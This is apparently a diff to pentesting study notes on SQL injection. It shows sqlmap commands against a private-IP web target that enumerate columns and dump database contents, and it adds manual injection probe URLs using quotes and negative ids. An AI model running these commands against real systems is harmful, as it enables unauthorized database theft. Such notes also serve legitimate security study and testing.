@@ -93,3 +93,11 @@ sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f
 sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" --columns 
 sqlmap -u "http://10.20.160.35/?action-data_management&cpmvc_do_action=mvparse&f=edit&id=1" -D "databasename" -T "tables" -C "columnName" --dump
 ```
+Manual testing for sqlmap can include using the following. 
+```
+http://site/name.php?henryearl=1
+http://site/name.php?henryearl=1'
+http://site/name.php?henryearl=-1
+http://site/name.php?henryearl=-1'
+```
+[Thanks to Database Tutorials] (https://www.youtube.com/watch?v=oWHKIiRGjtQ)
